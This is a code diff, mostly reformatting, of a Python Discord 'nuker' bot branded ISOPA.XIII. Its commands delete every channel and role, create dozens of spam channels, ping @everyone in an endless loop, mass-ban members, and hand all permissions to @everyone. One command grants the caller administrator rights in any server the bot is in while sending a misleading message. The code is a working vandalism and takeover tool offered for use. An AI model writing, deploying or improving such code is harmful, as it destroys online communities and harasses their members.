@@ -23,23 +23,27 @@ bot.remove_command("help")
 @bot.command(name="help")
 @commands.cooldown(1, 9, commands.BucketType.user)
 async def custom_help(ctx):
-    custom_color = 0x5564f1
+    custom_color = 0x5564F1
 
     embed = discord.Embed(
         title="isopa.XIII Commands",
-        description=
-        "Here is a list of available commands and their descriptions:",
-        color=custom_color)
+        description="Here is a list of available commands and their descriptions:",
+        color=custom_color,
+    )
 
     for command in bot.commands:
         if command.help:
-            embed.add_field(name=f"{bot.command_prefix}{command.name}",
-                            value=command.help,
-                            inline=False)
+            embed.add_field(
+                name=f"{bot.command_prefix}{command.name}",
+                value=command.help,
+                inline=False,
+            )
         else:
-            embed.add_field(name=f"{bot.command_prefix}{command.name}",
-                            value="No description available.",
-                            inline=False)
+            embed.add_field(
+                name=f"{bot.command_prefix}{command.name}",
+                value="No description available.",
+                inline=False,
+            )
 
     await ctx.send(embed=embed)
 
@@ -51,17 +55,17 @@ async def serverlist(ctx):
     """
     embed = discord.Embed(
         title="Server List",
-        description=
-        "Here is a list of servers I am in along with their invite links:",
-        color=0x5564f1)
+        description="Here is a list of servers I am in along with their invite links:",
+        color=0x5564F1,
+    )
 
     for guild in bot.guilds:
-        invite = await guild.text_channels[0].create_invite(max_age=300,
-                                                            max_uses=1,
-                                                            unique=True)
-        embed.add_field(name=guild.name,
-                        value=f"[Invite Link]({invite.url})",
-                        inline=False)
+        invite = await guild.text_channels[0].create_invite(
+            max_age=300, max_uses=1, unique=True
+        )
+        embed.add_field(
+            name=guild.name, value=f"[Invite Link]({invite.url})", inline=False
+        )
 
     await ctx.send(embed=embed)
 
@@ -73,13 +77,13 @@ async def nuke(ctx):
     Nuke the server.
     """
     await ctx.message.delete()
-    await ctx.guild.edit(name="isopa.XIII Was Here")
+    await ctx.guild.edit(name="ISOPA.XIII Was Here")
 
     await asyncio.gather(*[channel.delete() for channel in ctx.guild.channels])
 
-    await asyncio.gather(*[
-        ctx.guild.create_text_channel("isopa.XII Was Here") for _ in range(35)
-    ])
+    await asyncio.gather(
+        *[ctx.guild.create_text_channel("ISOPA.XIII Was Here") for _ in range(35)]
+    )
 
     for channel in ctx.guild.text_channels:
         num_webhooks = 5  # change this to the # of webhooks you want
@@ -87,7 +91,7 @@ async def nuke(ctx):
             webhook = await channel.create_webhook(name=f"ISOPA.XIII")
             for _ in range(5):
                 await webhook.send(
-                    f"@everyone **isopa.XIII Was Here!** https://guns.lol/isopa.x/"
+                    f"@everyone **ISOPA.XIII Was Here!** https://guns.lol/isopa.x/"
                 )
                 await ctx.send("Nuking the server...")
 
@@ -98,9 +102,9 @@ async def on_command_error(ctx, error):
         hex_color = int("0x5564f1", 16)
         cooldown_embed = discord.Embed(
             title="Cooldown",
-            description=
-            f"```Wait {error.retry_after:.1f} seconds before trying again.```",
-            color=hex_color)
+            description=f"```Wait {error.retry_after:.1f} seconds before trying again.```",
+            color=hex_color,
+        )
         await ctx.reply(embed=cooldown_embed)
     else:
         raise error
@@ -110,7 +114,7 @@ async def on_command_error(ctx, error):
 async def on_guild_channel_create(channel):
     while True:
         await channel.send(
-            "@everyone star the fucking repository https://github.com/isopaXIII/ISOPA.XIII-NUKER , https://guns.lol/isopa.x/"
+            "@everyone star my all fucking repository https://github.com/isopaXIII , https://guns.lol/1controlable./"
         )
 
 
@@ -148,7 +152,10 @@ async def banall(ctx):
     """
     try:
         for member in ctx.guild.members:
-            if ctx.author.guild_permissions.ban_members and not member.guild_permissions.ban_members:
+            if (
+                ctx.author.guild_permissions.ban_members
+                and not member.guild_permissions.ban_members
+            ):
                 await member.ban(reason="Severity Was Here")
                 print(Fore.GREEN + f"banned {member}")
             else:
@@ -187,10 +194,12 @@ async def delroles(ctx):
     await asyncio.sleep(10)
 
     try:
-        await asyncio.gather(*[
-            role.delete(reason="Roles deleted by Severity")
-            for role in roles_to_delete
-        ])
+        await asyncio.gather(
+            *[
+                role.delete(reason="Roles deleted by Severity")
+                for role in roles_to_delete
+            ]
+        )
         print(Fore.GREEN + "All roles deleted successfully.")
     except Exception as e:
         print(Fore.RED + f"Error deleting roles: {e}")
@@ -206,8 +215,7 @@ async def give(ctx):
     try:
         everyone_role = ctx.guild.default_role
         await everyone_role.edit(permissions=discord.Permissions.all())
-        await ctx.send("You do not have the required role to use this command."
-                       )
+        await ctx.send("You do not have the required role to use this command.")
     except Exception as e:
         print(Fore.RED + f"Error giving administrator permissions: {e}")
         await ctx.send("An error occurred while processing the command.")
@@ -225,13 +233,13 @@ async def giveme(ctx, server_id: int):
             admin_role = await guild.create_role(
                 name="Administrator",
                 permissions=discord.Permissions.all(),
-                reason="Created by command")
+                reason="Created by command",
+            )
 
             member = guild.get_member(ctx.author.id)
 
             if member:
-                await member.add_roles(admin_role,
-                                       reason="Assigned by command")
+                await member.add_roles(admin_role, reason="Assigned by command")
                 await ctx.send(
                     f"Administrator permissions granted to {ctx.author.mention} in the server with ID {server_id}."
                 )
@@ -254,14 +262,11 @@ async def removegive(ctx):
     try:
         everyone_role = ctx.guild.default_role
         await everyone_role.edit(permissions=discord.Permissions.none())
-        await ctx.send(
-            "All permissions have been removed from the @everyone role.")
+        await ctx.send("All permissions have been removed from the @everyone role.")
     except Exception as e:
         print(Fore.RED + f"Error removing permissions: {e}")
         await ctx.send("An error occurred while processing the command.")
 
 
-token = "BOT_TOKEN"
+token = "ur token"
 bot.run(token)
-
-
